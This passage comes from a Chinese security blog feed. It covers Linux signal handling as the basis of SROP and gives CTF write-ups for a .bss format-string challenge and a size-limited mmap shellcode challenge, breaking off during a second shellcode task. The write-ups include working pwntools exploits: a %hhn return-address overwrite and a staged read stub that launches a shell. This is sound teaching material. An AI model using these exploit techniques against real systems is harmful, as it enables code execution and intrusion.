continued</p><p>补充:</p><p>突然想到这一篇的tag是OS，那我就只写OS得了，后面在pwn的tag里专门开一个讲攻击，虽然网上有很多模板，但加我一个又何妨?</p><p>最近好多比赛，好难!被打到怀疑人生了，路漫漫其修远兮啊…</p><p>最后，祝大家新年快乐!</p><p>虽然这是一篇静态博客根本没人看，但我还是写得好像有很多人看一样，roxy，你这家伙…</p><p>感谢阅读…</p><p>生活愉快…</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dlresolve</tag>
      
      <tag>动态链接</tag>
      
      <tag>延迟绑定</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>signal</title>
    <link href="/2026/01/15/signal/"/>
    <url>/2026/01/15/signal/</url>
    
    <content type="html"><![CDATA[<p>此篇blog为SROP那一章的后续，主要补充一下linux中的<strong>信号</strong>处理机制</p><p>为什么写这篇呢，因为我发现我虽然能构造SROP利用，但是却并不明白为什么能这么做</p><p>最近在学习操作系统时，学习到了这么一个知识点，进程在进行上下文切换时，也会有保存寄存器，恢复寄存器这样的一个动作，但是保存的地方是内核栈，那我为什么在用户栈布置上下文(context)时能<code>make sense</code>呢?</p><p><img src="/images/9.png" alt="如图所示"></p><p>经过查阅资料发现，原来这两样东西完全是不同的机制。</p><p>第一种情况，在进程进行上下文切换时，例如从进程A切换至进程B，进程A的寄存器此时保存在内核栈，待进程A重新被调度时，才会从内核栈恢复寄存器，重新进入进程A，此时用户不可控。</p><p>第二种情况，也就是本文的主题，即linux系统的信号处理机制</p><p>信号在硬件层面发生异常&#x2F;中断时，内核会向进程发送<strong>信号</strong>，通知用户进程发生了某种事情</p><p>常见如:</p><ul><li><p>除数为零(异常) -&gt; SIGFPE</p></li><li><p>非法内存访问(异常) -&gt; SIGSEGV 也就是pwn手经常看到的<code>segmentation fault</code></p></li><li><p>当你按下<code>Ctrl+C</code>时(产生键盘中断) -&gt; SIGINT</p></li></ul><p>那么，内核如何发送这个信号到用户进程呢，本质是在用户态调用了一个<code>signal handler</code>函数，想象一下，用户进程正在愉快地执行，此时发生了某种事件，于是内核决定发送信号，CPU此时立即进入内核态(trap)，此时内核要保存被打断的寄存器，这便是第一种情况<code>受限直接执行</code>的一部分，但是这些寄存器只是暂时保存在内核栈，不是最终保存位置，我们接着看。</p><p>接下来，内核判断是否要处理信号，内核在一系列判断后，如果确定要发送这个<code>signal handler</code>，于是进入<code>signal delivery path</code>，接下来便是关键步骤:内核<strong>伪造</strong>用户态调用栈</p><p>内核会在用户栈上分配一个<code>sigframe</code>，简化后大致如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rt_sigframe</span> &#123;</span><br>    <span class="hljs-type">char</span> pretcode[<span class="hljs-number">8</span>];   <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> <span class="hljs-title">uc</span>;</span>   <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">siginfo</span> <span class="hljs-title">info</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这些分别代表什么？我们只需要关注两样东西</p><p>首先，<code>char pretcode[8];</code>，这个地址通常是glibc提供的<code>trampoline</code>，我们不妨叫它<code>rt_sigreturn_trampoline</code>，指令你应该很熟悉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax, SYS_rt_sigreturn  //linux x86-64下即是15<br>syscall<br></code></pre></td></tr></table></figure><p>然后，<code>ucontext</code>见下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  uc_flags;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> *<span class="hljs-title">uc_link</span>;</span><br>    <span class="hljs-type">stack_t</span>        uc_stack;<br>    <span class="hljs-type">sigset_t</span>       uc_sigmask;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span> <span class="hljs-title">uc_mcontext</span>;</span>  <span class="hljs-comment">// 想我了吗?</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>看到<code>sigcontext</code>了吗，这便是SROP中利用的关键，保存着所有的寄存器</p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> *<span class="hljs-title">fpstate</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> reserved1[<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>内核在用户栈伪造了这个<code>sigframe</code>后将<code>rip</code>设置为<code>handler</code>(即原执行流变为执行信号处理函数)，将<code>rsp</code>设置为<code>rt_sigreturn_trampoline</code>，在执行完信号处理函数后，因为<code>handler</code>函数的最后一条指令通常是<code>ret</code>，因此，<code>pop rip</code>，执行<code>rt_sigreturn_trampoline</code></p><p>系统再次进入内核态，无条件地信任它自己在用户栈设置的<code>sigframe</code>，从<code>sigcontext</code>中恢复所有保存的寄存器，程序恢复至被中断前的执行点</p><p>总结一下全过程:</p><p>1.用户代码正常运行，突然，发生程序异常&#x2F;硬件中断等”事故”</p><p>2.CPU进入内核态并保存寄存器到<code>pt_regs</code>(内核栈中的一个结构体，保存关键寄存器)</p><p>3.内核决定要运行<code>handler</code>:在用户栈写<code>rt_sigframe</code>(把<code>pt_regs</code>的快照写到<code>uc_mcontext</code>)，然后修改<code>pt_regs</code>使得<code>rip=handler</code>,<code>rsp=rt_sigframe</code>, 并设置<code>handler</code>参数寄存器</p><p>4.内核执行<code>return-to-user</code>(<strong>iretq</strong>)，CPU恢复并开始执行<code>handler</code>(看起来像是<code>normal call</code>)</p><p>5.<code>handler</code>执行完，ret，返回到<code>trampoline</code>，<code>trampoline</code> 做<code>syscall SYS_rt_sigreturn</code></p><p>6.内核进入<code>sys_rt_sigreturn</code>:<code>copy_from_user</code>把<code>rt_sigframe</code>中<code>sigcontext</code>保存的寄存器读回，写入 <code>pt_regs</code>，恢复信号</p><p>7.内核再次<code>return-to-user</code>(<strong>iretq</strong>)，CPU将<code>pt_regs</code>中的所有寄存器恢复到硬件，程序继续被中断前的执行点</p><p>至此，终于理解了SROP技术的本质:在用户栈上伪造一次“合法的信号处理返回现场”，然后<code>诱骗</code>内核执行<code>rt_sigreturn</code>(即想办法设置rax为15并syscall)，让内核按攻击者提供的上下文(<strong>sigcontext</strong>)恢复寄存器，彻底接管执行流!</p><p>感谢阅读!</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SROP</tag>
      
      <tag>linux信号机制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fmt_bss</title>
    <link href="/2026/01/02/fmt-bss/"/>
    <url>/2026/01/02/fmt-bss/</url>
    
    <content type="html"><![CDATA[<p>加餐~</p><p>今天依旧是一道格式化字符串漏洞的题目，题目出自NewStarCTF2025的week5pwn</p><p>题目给的提示-&gt;</p><p>hint:对于常规的栈上格式化字符串漏洞，可以任意构造自己的恶意数据来实现任意地址写，但是对于非栈上变量来说，就无法直接给出目的地址的指针，此时就需要留意栈上残留的内容，看看能不能找到可以利用的点(善用你的gdb)…</p><p>先来看看题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  setup();<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00102048);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_001020c0);<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-built_in">memset</span>(global_buffer,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(&amp;DAT_0010210d);   #一段嘲讽你的话<br>    read(<span class="hljs-number">0</span>,global_buffer,<span class="hljs-number">0xff</span>);<br>    <span class="hljs-built_in">printf</span>(global_buffer);  <span class="hljs-meta">#xswlhhh</span><br>    iVar1 = <span class="hljs-built_in">strcmp</span>(global_buffer,<span class="hljs-string">&quot;end\n&quot;</span>);<br>  &#125; <span class="hljs-keyword">while</span> (iVar1 != <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0010211a);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在后门函数<code>win</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(&amp;DAT_00102010,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>明显存在格式化字符串漏洞，但是对比<code>bss_got</code>的不同之处在于之前我们输入形如<code>AAAA.%p.%p.%p.%p</code>可以看到A写在哪里以实现任意地址写，这次是bss段上的fmt，因此并没有那么容易任意写，我们看看有哪些可以利用的地方，比如，栈上残留的某个<strong>指针</strong>?</p><p><img src="/images/7.png" alt="stack"></p><p>经过敏锐的观察，不难发现，第6个地址0x7fffffffdda0与第26个地址0x7fffffffde00在栈上存在着某种关系…</p><p><code>0x7fffffffdda0 —▸ 0x7fffffffde00 ◂— 0</code></p><p>怎么理解呢，二者也就是<strong>指针</strong>的关系</p><p>0x7fffffffdda0是一个栈地址，存储着值0x7fffffffde00(即指向这个地址的指针)</p><p>0x7fffffffde00是另一个栈地址，这里存储着0</p><p>那么就有思路了，我们用逐字节写的方式修改<code>0x7fffffffdda0</code>处的指针，使其指向返回地址(rip)的位置，同理，用逐字节写的方式修改<code>0x7fffffffde00</code>处的值为win函数所在的地址</p><p>可能略微有点抽象，但结果就是，返回地址(rip)变为了<code>0x7fffffffdda0</code>，而这又是一个指向<code>0x7fffffffde00</code>的指针，而<code>0x7fffffffde00</code>处的值已经被我们改写为了<code>win</code>，从而获得了<code>flag</code></p><p>真是精妙绝伦啊~</p><p>还有一点需要注意的是，程序是<code>pie enabled</code>(区别于<code>ASLR</code>)，但是也很明显，可以通过泄露的第一个地址<code>0x555555558060</code>获得pie基址</p><p><img src="/images/8.png" alt="vmmap"></p><p>使用vmmap可以看到<code>pie_base = p1 - 0x4060</code></p><p>那么<code>win = pie_base + win偏移</code></p><p>接下来就来展示一下exp吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p&#x27;</span>)<br>p_base = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x004060</span>    <span class="hljs-comment">#不保留换行符</span><br>log.success(<span class="hljs-string">f&#x27;p_base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(p_base)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p %p %p %p %p %p&#x27;</span>)<br>rip = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>).decode().split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">0x98</span>  <span class="hljs-comment">#计算rip，由图可知rip = p6 - 0x98</span><br>log.success(<span class="hljs-string">f&#x27;rip -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)&#125;</span>&#x27;</span>)<br><br>win = p_base + <span class="hljs-number">0x001289</span>  <span class="hljs-comment">#objdump -d ./bss_fmt | grep &quot;win&quot;</span><br>log.success(<span class="hljs-string">f&#x27;win -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(win)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%(<span class="hljs-number">256</span>*<span class="hljs-number">256</span>)&#125;</span>c%6$hn&#x27;</span>.encode())  <span class="hljs-comment">#改为rip</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#重复逐字节写...</span><br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">1</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">2</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">3</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">4</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">5</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#计划，通!</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>也是成功拿到<code>flag</code>了~</p><p>经过此题，应该能更加深刻地理解指针的本质，希望你能有所收获</p><p>感谢阅读…</p><p>天天开心…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fmt</tag>
      
      <tag>指针</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2026/01/02/shellcode/"/>
    <url>/2026/01/02/shellcode/</url>
    
    <content type="html"><![CDATA[<p>今天来分享一下关于shellcode编写技术的一些题目，在此之前，需要你对x86-64的汇编指令，寄存器调用约定，栈有一定了解</p><p>先来讲比较简单的ret2shellcode技术</p><p>前提条件是<code>NX</code>保护没开，即栈可执行</p><p>因此可以直接使用pwntools的一个非常强大的集成功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>通常payload是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = shellcode + 偏移 + addr_to_shellcode(返回地址)<br></code></pre></td></tr></table></figure><p>此时shellcode在栈上，你可能需要先泄露栈地址，当然在本地可以用gdb一眼看出</p><p>当然在这方面还有<code>ret2reg</code>,<code>NOP sled</code>等技术，就不展开了(´・ω・&#96;)，感兴趣可以自行查阅资料</p><p>下面分享一些我遇到的与shellcode编写相关的题目</p><p>这些题目普遍与<code>mmap</code>(Memory Map)相关，其是Unix&#x2F;Linux提供的一种将文件或设备映射到进程虚拟内存空间的机制，使得文件内容可以像操作普通内存一样被访问</p><p>先来看第一题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  code *__buf;<br>  init(param_1);<br>  __buf = (code *)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x114514</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input a small function (also after compile)&quot;</span>);<br>  read(<span class="hljs-number">0</span>,__buf,<span class="hljs-number">0x14</span>);<br>  clear();<br>  (*__buf)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mmap((void *)0x114514,0x1000,7,0x22,-1,0)</code>怎么理解呢，<code>0x114514</code>代表指定映射的期望地址,但也不一定必须是这儿(xswl),<code>0x1000</code>代表长度，这里是映射一页(4KB),7代表权限为<code>RWX</code>，可读可写可执行，这是关键，后面则表示这是一个纯内存页，不关联任何文件</p><p>所以这道题便很好理解了，直接把编写好的shellcode写入buf即可，接下来程序便会直接将其当作函数指针调用，并执行你的shellcode</p><p>但是关键点在于buf的长度只有0x14(20)，所以我们手动放大一下</p><p>首先关于read(0,buf,0x14)的寄存器调用约定，rax存放read的系统调用号0，rdi为第一个调用的寄存器，是fd(0,stdin)，rsi第二个，为buf的起始地址，rdx是读取的大小，最后执行<code>syscall</code>，就相当于执行了这么一个读取的指令</p><p>要扩大读取范围，我们将rdx修改为<code>0xff</code>(应该够了，注意限制，尽量少用一点字节数)，把rsi设置为当前的rip后0x20(大于0x14即可，同样限制一下字节数)的地址，调用syscall，写入shellcode，最后跳转rsi执行即可</p><p>我的exp，只用了13字节便成功改写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br>p.recvuntil(<span class="hljs-string">b&quot;compile)\n&quot;</span>)<br><br>stage1 = (<br>    <span class="hljs-string">b&quot;\x48\x8d\x35\x20\x00\x00\x00&quot;</span>  <span class="hljs-comment"># lea rsi, [rip+0x20]</span><br>    <span class="hljs-string">b&quot;\xb2\xff&quot;</span>                      <span class="hljs-comment"># mov dl, 0xff  只写2字节，极限</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span>                      <span class="hljs-comment"># syscall</span><br>    <span class="hljs-string">b&quot;\xff\xe6&quot;</span>                      <span class="hljs-comment"># jmp rsi</span><br>)<br><br>p.send(stage1)<br><br>time.sleep(<span class="hljs-number">0.05</span>)  <span class="hljs-comment"># 留一点时间读取shellcode</span><br><br>stage2 = asm(shellcraft.sh())<br>p.send(stage2.ljust(<span class="hljs-number">0xff</span>, <span class="hljs-string">b&quot;\x90&quot;</span>))  <span class="hljs-comment"># nop填满buf，避免rubbish</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>拿下!</p><p>接下来看第二题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 